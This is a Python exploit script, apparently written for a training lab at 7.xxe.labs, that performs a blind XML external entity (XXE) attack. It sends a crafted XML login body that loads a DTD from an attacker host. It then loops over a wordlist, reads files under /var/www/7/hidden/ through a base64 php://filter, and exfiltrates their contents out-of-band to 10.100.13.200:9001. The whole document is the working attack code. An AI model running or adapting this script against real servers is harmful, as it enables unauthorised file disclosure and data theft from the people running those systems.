import requests
import sys

url = "http://7.xxe.labs/login.php"

headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Accept': 'application/json, text/javascript, */*; q=0.01',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'text/xml',
'AuthXXE': 'login',
'X-Requested-With': 'XMLHttpRequest',
'Origin': 'http://7.xxe.labs',
'Connection': 'close',
'Referer': 'http://7.xxe.labs/'
}

data= '<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xxe [ <!ENTITY % EvilDTD SYSTEM "http://10.100.13.200:9001/xxe.dtd"> %EvilDTD; %LoadOOBEnt; %OOB; ]> <login> <username>XXEME</username> <password>password</password> </login>'


xxe="""
<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=FUZZ">
<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://10.100.13.200:9001/?p=%resource;'>">
"""

def sorting(wordlist):
	with open(wordlist, 'r') as file:
		for line in file:
			path = 'file:///var/www/7/hidden/'
			r = xxe.replace('FUZZ', path+line)
			r2 = r.replace('\n', '')
			r3 = r2.replace('"><!', '">\n<!')
			output = open('xxe.dtd', 'w')
			output.write(r3)
			output.close()
			print("Trying this file: " + line)
			r = requests.request("POST", url= url, headers= headers, data= data)
			print(r.text)


if __name__=='__main__':
    try:
    	wordlist_file = sys.argv[1]
    	sorting(wordlist_file)
    except:
    	print('[*] Usage: python3 xxe.py wordlist.txt')
    	sys.exit()
